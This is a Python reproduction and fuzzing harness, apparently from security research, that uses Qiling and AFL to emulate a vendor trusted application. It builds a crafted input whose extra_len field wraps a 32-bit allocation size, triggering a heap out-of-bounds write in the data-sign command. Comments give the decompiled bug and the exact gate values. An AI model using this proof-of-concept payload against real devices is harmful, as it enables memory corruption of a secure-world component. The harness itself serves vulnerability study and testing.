#from params import *
from .params import *
from pwn import *
from qiling import Qiling
import struct, os

# === MITD-1 / S16-F10 structure-aware reproduction harness =============
# Target: klee mitd 8aaaf201-2460-0010-aabbccdd00000008 (the S16-pinned build,
#   sha 7157cd65…), staged misa-style (no inline GP table). cmd 0x9002 (data sign).
#
# REAL gate (klee TA_InvokeCommandEntryPoint @0x200E0):
#   paramTypes==0x65 ; params[0].size==0x2000 (INPUT) ; params[1].size==0x1000 (OUTPUT).
#   cmd 0x9002 -> mitd_data_sign(@0x21CE0) with x0=IN+0x10, w1=in_len(=[IN+8]? no:
#     w1 = [x23+8] = *(u32*)(IN_buf+8))... see note. x2=OUT+0x10, x3=OUT+8.
#   NOTE: dispatch does `ldr w1,[x23,#8]` where x23=params[0].buf -> the parser's
#     `in_len` = *(u32*)(IN_buf+8) (attacker u32 in the 0x10-byte header), and the
#     parsed content starts at IN_buf+0x10 (`add x0,x23,#0x10`).
#
# BUG (mitd_data_sign @0x21CE0, S16-F10, decompiled from klee):
#     nonce_len = read_u32(in+0)
#     pkg_len   = read_u32(in + nonce_len + 4)            // v13/v26
#     v81       = nonce_len + 8 + pkg_len
#     extra_len = read_u32(in + v81)                      // v84
#     v37 = extra_len + nonce_len + pkg_len + 193 + strlen(extra_json)  // 32-bit, NO overflow check
#     buf = xiaomi_malloc(v37)                            // undersized when v37 wraps
#     memcpy(buf,        in+1, nonce_len)
#     memcpy(buf+n,      in+v81+4, extra_len)             // <-- attacker-length write
#     memcpy(buf+...,    fid, 193) ; memcpy(buf+..., pkg, pkg_len) ; ...
#
#   To wrap the malloc while keeping all 3 length *reads* in-bounds, the wrap driver
#   is **extra_len** (the 3rd field, read from an in-bounds offset v81): set
#   nonce_len=16, pkg_len=4 (so reads at in+0/in+20/in+28 are valid), and
#   extra_len=0xFFFFFFF0 -> v37 = 0xFFFFFFF0 + small wraps to a tiny malloc, then
#   `memcpy(buf+n, src, extra_len=0xFFFFFFF0)` is a massive heap OOB write.
#
# Input frame (content at IN+0x10):
#   [u32 nonce_len=16][16 B nonce][u32 pkg_len=4]["pkg0"][u32 extra_len=0xFFFFFFF0]
#   The extra body need not be present (the bug is the unchecked length, the write
#   faults on the undersized dst). INPUT & OUTPUT params are redzoned.

CMD = 0x9002
PTYPES = 0x65
INSZ = 0x2000
OUTSZ = 0x1000

NONCE_LEN = int(os.environ.get("F10_NONCE", "16"), 0) & 0xFFFFFFFF
PKG_LEN   = int(os.environ.get("F10_PKG", "4"), 0) & 0xFFFFFFFF
EXTRA_LEN = int(os.environ.get("F10_EXTRA", str(0xFFFFFFF0)), 0) & 0xFFFFFFFF

def _build(nonce_len, pkg_len, extra_len):
    # content @ IN+0x10:
    #   +0:           u32 nonce_len
    #   +4:           nonce_len bytes (we place nonce_len real bytes when small)
    #   +4+nonce_len: u32 pkg_len
    #   +8+nonce_len: pkg_len bytes
    #   +8+nonce_len+pkg_len: u32 extra_len  (== in + v81)
    nb = nonce_len if nonce_len <= 256 else 16
    pb = pkg_len if pkg_len <= 256 else 4
    content = struct.pack("<I", nonce_len) + b"N" * nb
    content += struct.pack("<I", pkg_len) + b"P" * pb
    content += struct.pack("<I", extra_len)               # extra_len at in + (nonce_len+8+pkg_len)
    content += b"E" * 16                                   # a little extra body
    header = b"\x00" * 8 + struct.pack("<I", INSZ - 0x10) + b"\x00" * 4
    buf = (header + content)[:INSZ].ljust(INSZ, b"\x00")
    return buf

def place_input_callback(ql: Qiling, input: bytes, _: int):
    nonce_len = NONCE_LEN
    pkg_len = PKG_LEN
    extra_len = EXTRA_LEN
    if len(input) >= 4 and "F10_EXTRA" not in os.environ:
        # AFL explores the wrap window on extra_len (the driver)
        extra_len = (0xFFFFFF00 | input[0]) & 0xFFFFFFFF
    buf = _build(nonce_len, pkg_len, extra_len)
    print(f"[F10] cmd=0x9002 nonce_len={nonce_len:#x} pkg_len={pkg_len:#x} extra_len={extra_len:#x} "
          f"(v37 wraps -> undersized malloc -> memcpy(extra_len) OOB write)")
    command_params = [
        MemRefParam(buf, INSZ),            # param0 INPUT (redzoned 0x2000)
        MemRefParam(bytes(OUTSZ), OUTSZ),  # param1 OUTPUT (redzoned 0x1000)
        NoneParam(),
        NoneParam(),
    ]
    setup_params_fuzz(ql, CMD, PTYPES, command_params)
    return True
